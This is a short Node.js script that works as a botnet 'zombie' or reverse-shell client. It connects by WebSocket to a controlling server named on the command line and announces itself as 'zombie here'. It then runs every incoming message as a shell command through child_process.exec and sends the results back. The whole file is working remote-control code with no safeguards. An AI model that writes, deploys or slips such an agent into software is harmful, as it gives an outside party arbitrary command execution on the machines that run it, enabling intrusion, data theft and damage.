const WebSocket = require('ws')
const child_process = require('child_process')
const util = require('util')
const exec = util.promisify(child_process.exec)

const url = process.argv[2] || 'ws://localhost:8080'
const ws = new WebSocket(url)

ws.on('open', () => {
  ws.send('zombie here')
})

ws.on('message', async (data) => {
  console.log(data)
  const result = await exec(data)
  console.log(result)
  const response = JSON.stringify(result)
  ws.send(response)
})
